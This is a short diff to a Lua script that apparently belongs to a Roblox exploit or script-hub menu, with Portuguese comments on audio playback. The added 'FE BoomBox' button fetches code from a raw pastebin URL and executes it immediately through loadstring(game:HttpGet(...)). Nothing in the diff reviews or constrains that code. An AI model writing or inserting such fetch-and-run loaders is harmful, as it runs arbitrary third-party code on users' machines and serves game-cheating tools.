@@ -4379,6 +4379,7 @@ local function playLoopedAudio()
     end
 end
 
+
 -- Toggle para loop de áudio
 Tab:AddToggle({
     Name = "Loop Play Audio",
@@ -4415,6 +4416,14 @@ local function playAudio()
         warn("no audio selected.")
     end
 end
+
+Tab:AddSection({"BoomBox"})
+Tab:AddButton({
+    Name = "FE BoomBox",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/d3uKY85d"))()
+    end
+})
 
 -- Nova seção para tocar áudio
 Tab:AddSection({"Play Audio"})
